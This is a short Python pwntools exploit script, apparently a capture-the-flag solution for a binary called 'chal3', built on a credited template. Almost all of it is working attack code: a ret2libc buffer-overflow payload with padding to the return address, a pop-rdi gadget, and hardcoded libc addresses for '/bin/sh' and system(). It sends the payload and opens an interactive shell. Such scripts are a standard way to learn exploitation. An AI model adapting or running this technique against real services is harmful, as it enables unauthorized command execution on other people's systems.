# Credit to Crypto-Cat on Github for this template

from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './chal3'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

libc_base = 0x00007ffff7dd0000
system = libc_base + 0x45e50
binsh = libc_base + 0x195152
pop_rdi = 0x4011eb

# How many bytes to the instruction pointer (RIP)?
padding = 40

payload = flat(
    asm('nop') * padding,  # Padding up to RIP
    pop_rdi,  # Pop the following address into the RDI register
    binsh,  # Address of /bin/sh in libc
    system,  # Address of system function in libc
)

# Write payload to file
write('payload', payload)

# Exploit
io.sendlineafter(b'?', payload)

# Get flag/shell
io.interactive()
